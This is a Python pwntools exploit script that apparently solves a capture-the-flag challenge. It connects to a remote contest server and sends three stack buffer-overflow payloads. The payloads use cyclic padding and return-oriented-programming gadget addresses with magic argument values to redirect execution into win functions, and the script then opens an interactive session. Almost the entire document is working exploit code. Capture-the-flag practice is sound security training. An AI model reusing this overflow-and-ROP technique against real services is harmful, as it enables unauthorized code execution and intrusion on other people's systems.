from pwn import *

#p = process('chall')
p = remote('connect.umbccd.net', 22237)

#p = gdb.debug('./chall', gdbscript='''b*win2 c ''')  

p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'4')
payload1 = cyclic(152) + p64(0x000000000040101a)+ p64(0x401401)   
p.sendline(payload1)

part1= p.recvn(4)
print(part1 , end='\n\n')

payload2 = cyclic(40) + p64(0x00000000004017d6) + p64(0xDEADBEEF) + p64(0x000000000040101a) + p64(0x401314)
p.sendline(payload2)

part2 = p.recvn(2)
print(part2,end='\n\n')

payload3 = cyclic(56) + p64(0x00000000004017d6) + p64(0xDEADBEEF) + p64(0x00000000004017d8) + p64(0xDEAFFACE) + p64(0x00000000004017da) + p64(0xFEEDCAFE) + p64(0x000000000040101a) + p64(0x00000000004011e6)
p.sendline(payload3)



p.interactive()
